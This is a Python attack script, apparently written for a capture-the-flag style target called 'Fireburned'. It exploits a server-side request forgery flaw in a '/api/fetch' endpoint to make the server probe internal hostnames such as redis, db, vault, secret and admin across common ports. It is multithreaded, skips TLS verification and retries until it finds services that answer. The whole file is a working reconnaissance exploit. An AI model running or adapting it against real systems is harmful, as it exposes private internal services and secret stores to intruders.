#!/usr/bin/env python3
"""Fireburned - descubre otros servicios internos por DNS via SSRF."""
import concurrent.futures as cf
import json
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

MIRROR = sys.argv[1] if len(sys.argv) > 1 else "fireburned-3"
BASE = f"https://<host>/{MIRROR}"
H = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}

NAMES = ["app", "web", "api", "admin", "internal", "worker", "queue", "cache",
         "redis", "db", "database", "store", "metadata", "flag", "secret",
         "vault", "auth", "gateway", "proxy", "mail", "smtp", "notify",
         "notifier", "preview", "render", "cards", "card", "ember", "hook",
         "hooks", "webhook", "backend", "service", "lab", "console", "panel"]
PORTS = [8080, 3000, 80, 5000, 8000]


def call(url, tries=6):
    p = {"url": url, "method": "GET"}
    for _ in range(tries):
        try:
            r = requests.post(BASE + "/api/fetch", data=json.dumps(p),
                              headers=H, timeout=10, verify=False)
            if r.status_code in (502, 503, 504):
                time.sleep(0.25)
                continue
            return r.json()
        except Exception:
            time.sleep(0.25)
    return {"error": "no_response"}


def job(name, port):
    hosts = [f"fireburned--{name}", name]
    for h in hosts:
        j = call(f"http://{h}:{port}/health")
        err = j.get("error") if isinstance(j, dict) else None
        if err in ("dns_failed", "host_blocked"):
            continue
        return f"{h}:{port}", json.dumps(j)[:200]
    return None


if __name__ == "__main__":
    tasks = [(n, p) for n in NAMES for p in PORTS]
    with cf.ThreadPoolExecutor(max_workers=8) as ex:
        for res in ex.map(lambda t: job(*t), tasks):
            if res:
                print(f"{res[0]:40} -> {res[1]}", flush=True)
    print("fin")
